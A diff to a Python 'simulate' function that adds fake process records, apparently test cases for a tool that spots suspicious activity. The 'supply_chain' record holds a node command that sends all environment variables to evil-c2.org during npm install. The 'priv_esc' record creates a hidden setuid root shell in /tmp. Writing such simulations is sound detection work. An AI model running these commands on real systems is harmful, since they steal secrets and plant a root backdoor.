@@ -177,6 +177,22 @@ def simulate(sim_type):
             "is_interactive": False,
             "user": "vatsalagarwal"
         },
+        "supply_chain": {
+            "pid": 58312,
+            "cmd": "node -e 'require(\"http\").get(\"http://evil-c2.org/?env=\"+encodeURIComponent(JSON.stringify(process.env)))'",
+            "parent": "npm install",
+            "path": "/Users/vatsalagarwal/Documents/IT & CS/Project/node_modules",
+            "is_interactive": False,
+            "user": "vatsalagarwal"
+        },
+        "priv_esc": {
+            "pid": 72104,
+            "cmd": "sudo -S cp /bin/sh /tmp/.rootshell && chmod +s /tmp/.rootshell",
+            "parent": "daemon_worker",
+            "path": "/tmp/.rootshell",
+            "is_interactive": False,
+            "user": "vatsalagarwal"
+        },
         "benign": {
             "pid": 10420,
             "cmd": "git push origin feature/gui-dashboard",
